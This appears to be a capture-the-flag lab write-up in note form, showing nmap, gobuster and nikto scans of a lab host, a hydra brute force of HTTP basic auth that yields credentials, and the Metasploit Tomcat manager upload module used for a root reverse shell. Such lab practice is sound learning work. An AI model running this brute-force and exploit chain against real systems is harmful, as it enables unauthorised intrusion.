export ip=10.10.86.32

# Recon and Scanning

## nmap
- `sudo nmap -sC -sV -O -oG nmap.log $ip`
  - 80, 22, 1234, 8009

## hydra
- `hydra -l bob -P /usr/share/wordlists/rockyou.txt $ip http-get "/protected"`

## gobuster
- `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip | tee gobuster.log`
- `gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip:1234 | tee gobuster-1234.log`

## nikto
- `nikto -h http://10.10.86.32:1234/manager/ -id bob:bubbles`

# Process
- from running gobuster we get many directories, one among those is `guidelines`. In this webpage its mentioned that one of the admins of the website is `bob`
- there is another directory called `protected` and it uses http basic auth as the auth mechanism. Considering we know the username, we can try hydra to brute force it.
- hydra breaks the password fairly quickly
- but upon accessing this protected page, it says it's moved to a different port
- so tried one of the open ports from the nmap scan results, 1234, this gives us a few answers
- but couldn't find the protected page, so tried gobuster again on this port, and found a dir called manager, tried the user/pass we got from hydra and we got in
- had a look around and found that this is an older version of tomcat and there are many vilnerabilities.
- I found one which is pretty promising to use to get a shell
  - `multi/http/tomcat_mgr_upload`
- Using metasploit spawned a reverseshell where the user was actually root
- found the final flag inside roots home dir